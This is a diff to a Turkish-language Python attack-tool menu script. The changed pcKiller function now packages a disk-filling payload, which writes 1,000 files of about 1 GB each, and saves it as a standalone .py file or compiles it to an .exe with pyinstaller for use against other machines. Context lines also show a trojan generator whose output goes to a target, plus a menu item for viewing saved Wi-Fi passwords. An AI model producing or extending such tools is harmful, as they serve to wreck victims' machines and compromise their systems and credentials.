@@ -1718,30 +1718,39 @@ def dork():
         print("No links found.")
 
 def pcKiller():
-    print("Çalıştırma pc gg olur dikkat et")
-    a = int(input("eminsen 1 e bas"))
-    if a == 1:
-        print("pc gg olacak cidden eminmisin bu son uyarı")
-        b = int(input("eminsen 2 e bas"))
-        if b == 2:
-            def generate_random_data(size):
-                return ''.join(chr(random.randint(0, 127)) for _ in range(size))
-
-            def create_large_text_file(file_path, size_gb):
-                size_bytes = size_gb * 1024 * 1024 * 1024
-                with open(file_path, 'wb') as file:
-                    while size_bytes > 0:
-                        chunk_size = min(size_bytes, 100 * 1024 * 1024)  # 100MB
-                        data = generate_random_data(chunk_size)
-                        file.write(data.encode('ascii'))
-                        size_bytes -= len(data)
-
-            if __name__ == "__main__":
-                for i in range(1000):
-                    file_path = f"large_file_{i}.txt"
-                    size_gb = 1
-                    create_large_text_file(file_path, size_gb)
-                    print(f"{file_path} dosyası oluşturuldu ve içine yaklaşık 1GB veri yazıldı.")
+    kod = '''
+import random
+def generate_random_data(size):
+    return ''.join(chr(random.randint(0, 127)) for _ in range(size))
+def create_large_text_file(file_path, size_gb):
+    size_bytes = size_gb * 1024 * 1024 * 1024
+    with open(file_path, 'wb') as file:
+        while size_bytes > 0:
+            chunk_size = min(size_bytes, 100 * 1024 * 1024)  # 100MB
+            data = generate_random_data(chunk_size)
+            file.write(data.encode('ascii'))
+            size_bytes -= len(data)
+if __name__ == "__main__":
+    for i in range(1000):
+        file_path = f"large_file_{i}.txt"
+        size_gb = 1
+        create_large_text_file(file_path, size_gb)
+        print(f"{file_path} dosyası oluşturuldu ve içine yaklaşık 1GB veri yazıldı.")
+            
+'''
+    print("[1] .py olarak kayot et\n[2] .exe olarak kayıt et")
+    c = int(input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları/PcKiller/DosyaKayıtEtme$ "))
+    if c == 1:
+        ths = open("pcKiller.py", "w")
+        ths.write(kod)
+        print("Dosya 'pcKiller.py' olarak kayıt edildi")
+        time.sleep(2)
+    if c == 2:
+        ths = open("pcKiller.py", "w")
+        ths.write(kod)
+        subprocess.run(["pyinstaller", "--onefile", "pcKiller.py"], check=True)
+        print("'pcKiller.exe' olarak kayıt edildi")
+        time.sleep(2)
 
 def trojenOluşturucu():
     print("sen.py dosyası sizde kalacak o.py dosyayını hesef kişiye göndereceksiniz...")
@@ -2403,6 +2412,7 @@ def main():
     [6] İstatislik
         |
         |-> Kayıtlı Wifi Ağlarını ve Şifrelerini Görüntüleme
+    [99] Çıkış
     ''')
         
         a = int(input(f"HeJo@{user}:~$ "))
@@ -2418,5 +2428,7 @@ def main():
             kriptolojiTooları()
         elif a == 6:
             istatislik()
+        elif a == 99:
+            exit()
 if __name__ == "__main__":
     main()
